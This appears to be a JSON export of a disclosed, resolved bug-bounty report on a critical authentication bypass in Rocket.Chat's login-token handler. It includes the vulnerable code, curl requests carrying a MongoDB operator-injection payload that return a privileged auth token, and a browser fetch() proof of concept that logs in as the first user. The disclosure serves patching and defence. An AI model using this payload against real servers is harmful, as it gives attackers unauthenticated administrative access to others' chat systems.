{
  "id": 1447619,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ3NjE5",
  "url": "https://hackerone.com/reports/1447619",
  "title": "Authentication Bypass in login-token Authentication Method",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2022-01-12T01:53:41.242Z",
  "submitted_at": "2022-01-12T01:53:41.301Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "gronke",
    "url": "/gronke",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 19858,
    "url": "https://hackerone.com/rocket_chat",
    "handle": "rocket_chat",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Rocket.Chat",
      "twitter_handle": "RocketChat",
      "website": "https://rocket.chat",
      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": true,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2024-08-10T21:57:39.310Z",
  "bug_reporter_agreed_on_going_public_at": "2024-07-11T21:57:37.428Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\n\nImproper input data validation in the `login-token` authentication method leads to an authentication bypass.\n\n## Description\n\nData from HTTP POST requests is forwarded to hardcoded Login Handlers, including the `login-token` method defined in [app/token-login/server/login_token_server.js#L10](https://github.com/RocketChat/Rocket.Chat/blob/a06e811ceeef6f674ff8c38e49ddcf0f476d9683/app/token-login/server/login_token_server.js#L10).\n\n```javascript\nAccounts.registerLoginHandler('login-token', function (result) {\n\tif (!result.loginToken) {\n\t\treturn;\n\t}\n\n\tconst user = Meteor.users.findOne({\n\t\t'services.loginToken.token': result.loginToken,\n\t});\n\n\tif (user) {\n\t\tMeteor.users.update({ _id: user._id }, { $unset: { 'services.loginToken': 1 } });\n\n\t\treturn {\n\t\t\tuserId: user._id,\n\t\t};\n\t}\n});\n```\n\nThe `result.loginToken` parameter is taken from the HTTP POST requests JSON body of the `/api/v1/login` route, so that Mongo DB injection returns a valid authToken for the first matching user. \n\n```console\n$ curl -s 'http://127.0.0.1:3000/api/login' -H \"Content-Type: application/json\" -d '{\"loginToken\": { \"$exists\": false }}' | head\n{\n  \"status\": \"success\",\n  \"data\": {\n    \"userId\": \"rocket.cat\",\n    \"authToken\": \"MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB\",\n    \"me\": {\n      \"_id\": \"rocket.cat\",\n      \"avatarOrigin\": \"local\",\n      \"name\": \"Rocket.Cat\",\n      \"username\": \"rocket.cat\",\n```\n\nTypically the first user in a Rocket.Chat MongoDB database is `rocket.cat`, which is a privileged account. This can be confirmed by using the returned secret in an API call to `/api/v1/me`:\n\n```console\n$ curl -H \"x-user-id: rocket.cat\" -H \"x-auth-token: MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB\" http://127.0.0.1:3000/api/v1/me              \n{                                                                                                                                                                        \n  \"_id\": \"rocket.cat\",                                                                                                                                                   \n  \"avatarOrigin\": \"local\",                                                                                                                                               \n  \"name\": \"Rocket.Cat\",                                                                                                                                                  \n  \"username\": \"rocket.cat\",                                                                                                                                              \n  \"status\": \"away\",                                                                                                                                                      \n  \"statusDefault\": \"online\",                                                                                                                                             \n  \"utcOffset\": 1,                                                                                                                                                        \n  \"active\": true,                                                                                                                                                        \n  \"_updatedAt\": \"2022-01-12T01:45:57.208Z\",                                                                                                                              \n  \"roles\": [\n    \"bot\"\n  ],\n```\n\nWhen loginToken is legitimately used an attacker would need to switch the strategy from using `$empty` to `$regex` instead.\n\n## Releases Affected:\n\n  * 4.3.1\n  * 3.18.3\n  * develop\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Open Rocket.Chat (logged out)\n  2. Open Web Inspector\n  3. Run PoC Request\n\n## Supporting Material/References:\n\n### Proof of Concept\n\n```javascript\nfetch(\"/api/v1/login\", {\n  method: \"POST\",\n  body: '{\"loginToken\": { \"$exists\": false }}',\n  headers: {\n    \"Content-Type\": \"application/json\"\n  }\n})\n.then(res => res.json())\n.then(({ data: { userId, authToken }}) => {\n  console.log(`login as ${userId}`)\n  Meteor._localStorage.setItem(Accounts.USER_ID_KEY, userId);\n  Meteor._localStorage.setItem(Accounts.LOGIN_TOKEN_KEY, authToken);\n  window.location.reload()\n});\n```\n\n## Suggested mitigation\n\n  * Validate `result.loginToken` input data in loginToken auth handler.\n\n## Impact\n\nUnauthenticated clients can bypass the login and obtain administrative access to the Rocket.Chat instance.",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2024-08-10T21:57:37.526Z",
  "allow_singular_disclosure_after": -35065599.69085532,
  "singular_disclosure_allowed": true,
  "vote_count": 24,
  "voters": [
    "ganeshbagaria",
    "skeptiker",
    "eminfidan",
    "shakhriyorbro",
    "tronster",
    "dannybug",
    "nightninj4",
    "sampathskn07",
    "aliening",
    "pr4v1n",
    "and 14 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 10.0,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
